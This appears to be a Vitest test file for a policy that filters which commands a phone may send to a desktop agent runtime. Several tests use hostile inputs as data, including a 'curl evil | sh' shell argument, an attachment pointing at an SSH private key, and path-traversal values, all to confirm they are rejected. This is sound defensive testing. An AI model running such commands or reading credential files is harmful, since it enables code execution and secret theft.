import { ProjectId, type RuntimeProjection, WorktreeId } from "@zli-v2/contracts";
import { describe, expect, it } from "vitest";

import { checkPhoneMessage, isPhoneCommand, PHONE_COMMANDS, worktreeRoot } from "./policy.js";

const projectId = ProjectId.parse("40000000-0000-4000-8000-000000000001");
const worktreeId = WorktreeId.parse("50000000-0000-4000-8000-000000000001");
const threadId = "60000000-0000-4000-8000-000000000001";
const terminalId = "70000000-0000-4000-8000-000000000001";
const commandId = "10000000-0000-4000-8000-000000000001";

const projection: Pick<RuntimeProjection, "projects" | "worktrees"> = {
  projects: [{ projectId, path: "/home/sam/app", name: "app" }],
  worktrees: [{ worktreeId, projectId, path: "/home/sam/app-worktrees/fix", branch: "fix", status: "ready" }],
};

function command(body: Record<string, unknown>) {
  return { type: "command", request: { protocolVersion: 1, commandId, command: body } };
}

function decide(body: Record<string, unknown>) {
  return checkPhoneMessage(command(body), projection).kind;
}

describe("phone message policy", () => {
  it("forwards reads: subscribe, projection.get, and terminal.attach", () => {
    expect(checkPhoneMessage({ type: "subscribe", afterSequence: 4 }, projection).kind).toBe("forward");
    expect(checkPhoneMessage({ type: "projection.get" }, projection).kind).toBe("forward");
    expect(checkPhoneMessage({ type: "terminal.attach", terminalId, afterSequence: 0 }, projection).kind).toBe(
      "forward",
    );
  });

  it("closes on a runtime hello or a message that does not parse", () => {
    const hello = { type: "hello", protocolVersion: 1, token: "x", environmentId: projectId };
    expect(checkPhoneMessage(hello, projection).kind).toBe("invalid");
    expect(checkPhoneMessage({ type: "files.read" }, projection).kind).toBe("invalid");
    expect(checkPhoneMessage("nope", projection).kind).toBe("invalid");
  });

  it("forwards the chat and terminal commands a phone needs", () => {
    expect(decide({ type: "thread.send", threadId, text: "hi" })).toBe("forward");
    expect(decide({ type: "thread.queue", threadId, queueId: "q1", text: "next" })).toBe("forward");
    expect(decide({ type: "thread.queue.remove", threadId, queueId: "q1" })).toBe("forward");
    expect(decide({ type: "thread.steer", threadId, queueId: "q1" })).toBe("forward");
    expect(decide({ type: "thread.interrupt", threadId })).toBe("forward");
    expect(decide({ type: "thread.stop", threadId })).toBe("forward");
    expect(decide({ type: "thread.respond", threadId, requestId: "r1", decision: { allow: true } })).toBe("forward");
    expect(decide({ type: "thread.user-input", threadId, requestId: "r1", answers: { q: "yes" } })).toBe("forward");
    expect(decide({ type: "terminal.write", terminalId, data: "ls\r" })).toBe("forward");
    expect(decide({ type: "terminal.resize", terminalId, cols: 80, rows: 24 })).toBe("forward");
    expect(decide({ type: "terminal.read", terminalId })).toBe("forward");
  });

  it("blocks runtime-internal reports, destructive commands, and everything not listed", () => {
    const blocked = [
      { type: "thread.status", threadId, status: "idle" },
      { type: "thread.message", message: { messageId: "m", threadId, role: "assistant", text: "forged" } },
      { type: "thread.request.resolved", threadId, requestId: "r1" },
      { type: "thread.queue.flush", threadId },
      { type: "worktree.status", worktreeId, status: "ready" },
      { type: "worktree.removed", worktreeId },
      { type: "worktree.remove", worktreeId, force: true },
      { type: "worktree.import", worktreeId, projectId, path: "/", branch: "main", kind: "checkout" },
      { type: "session.delete", sessionId: threadId },
      { type: "project.register", path: "/etc" },
      { type: "project.archive", projectId },
      { type: "browser.closed", browserTabId: "b1" },
      { type: "terminal.stop", terminalId },
      { type: "terminal.list" },
      { type: "review.merge", worktreeId, targetRef: "main" },
      { type: "diagnostics.createSupportBundle", destinationPath: "/tmp/x" },
      { type: "legacy.import", batchId: "b", selectedRecordIds: [] },
    ];
    for (const body of blocked) {
      const decision = checkPhoneMessage(command(body), projection);
      expect(decision.kind === "forward", body.type).toBe(false);
    }
  });

  it("answers a blocked but well-formed command instead of closing", () => {
    const decision = checkPhoneMessage(command({ type: "project.archive", projectId }), projection);
    expect(decision).toEqual({ kind: "reject", commandId, reason: "Phones cannot send project.archive." });
  });

  it("only lists real runtime commands", () => {
    expect(PHONE_COMMANDS.every(isPhoneCommand)).toBe(true);
    expect(isPhoneCommand("files.read")).toBe(false);
    expect(isPhoneCommand("thread.status")).toBe(false);
  });

  it("refuses attachments, which can name any desktop file", () => {
    const attachments = [{ name: "id_rsa", mimeType: "text/plain", path: "/home/sam/.ssh/id_rsa" }];
    expect(decide({ type: "thread.send", threadId, text: "read this", attachments })).toBe("reject");
    expect(decide({ type: "thread.queue", threadId, queueId: "q", text: "read this", attachments })).toBe("reject");
  });

  it("starts agents only in their own worktree folder", () => {
    const start = { type: "thread.start", threadId, worktreeId, provider: "codex" };
    expect(decide({ ...start, cwd: "/home/sam/app-worktrees/fix" })).toBe("forward");
    expect(decide({ ...start, cwd: "/home/sam/app-worktrees/fix/" })).toBe("forward");
    expect(decide({ ...start, cwd: "/home/sam" })).toBe("reject");
    expect(decide({ ...start, worktreeId: projectId, cwd: "/home/sam/app-worktrees/fix" })).toBe("reject");
    expect(checkPhoneMessage(command({ ...start, cwd: "/home/sam/app-worktrees/fix" }), undefined).kind).toBe("reject");
  });

  it("opens only interactive shells in a worktree folder", () => {
    const create = {
      type: "terminal.create",
      terminalId,
      worktreeId,
      cwd: "/home/sam/app-worktrees/fix",
      shell: "/bin/bash",
      title: "Shell",
      cols: 80,
      rows: 24,
    };
    expect(decide(create)).toBe("forward");
    expect(decide({ ...create, cwd: "/" })).toBe("reject");
    expect(decide({ ...create, args: ["-c", "curl evil | sh"] })).toBe("reject");
    expect(decide({ ...create, agent: { provider: "codex" } })).toBe("reject");
  });

  it("creates worktrees only in the project's worktrees folder", () => {
    const root = worktreeRoot("/home/sam/app/");
    expect(root).toBe("/home/sam/app-worktrees");
    const create = { type: "worktree.create", worktreeId, projectId, branch: "feature/login" };
    expect(decide({ ...create, workspaceRoot: root, path: `${root}/feature-login` })).toBe("forward");
    expect(decide({ ...create, workspaceRoot: "/", path: "/etc" })).toBe("reject");
    expect(decide({ ...create, workspaceRoot: root, path: `${root}/a/b` })).toBe("reject");
    expect(decide({ ...create, workspaceRoot: root, path: `${root}/..` })).toBe("reject");
    expect(decide({ ...create, workspaceRoot: root, path: `${root}x/evil` })).toBe("reject");
    expect(decide({ ...create, workspaceRoot: root, path: root })).toBe("reject");
  });

  it("accepts Windows paths with either separator", () => {
    const windows: Pick<RuntimeProjection, "projects" | "worktrees"> = {
      projects: [{ projectId, path: "C:\\code\\app", name: "app" }],
      worktrees: [{ worktreeId, projectId, path: "C:\\code\\app-worktrees\\fix", branch: "fix", status: "ready" }],
    };
    const start = command({
      type: "thread.start",
      threadId,
      worktreeId,
      provider: "codex",
      cwd: "C:/code/app-worktrees/fix",
    });
    expect(checkPhoneMessage(start, windows).kind).toBe("forward");
    const create = command({
      type: "worktree.create",
      worktreeId,
      projectId,
      branch: "fix",
      workspaceRoot: "C:\\code\\app-worktrees",
      path: "C:\\code\\app-worktrees/fix",
    });
    expect(checkPhoneMessage(create, windows).kind).toBe("forward");
  });
});
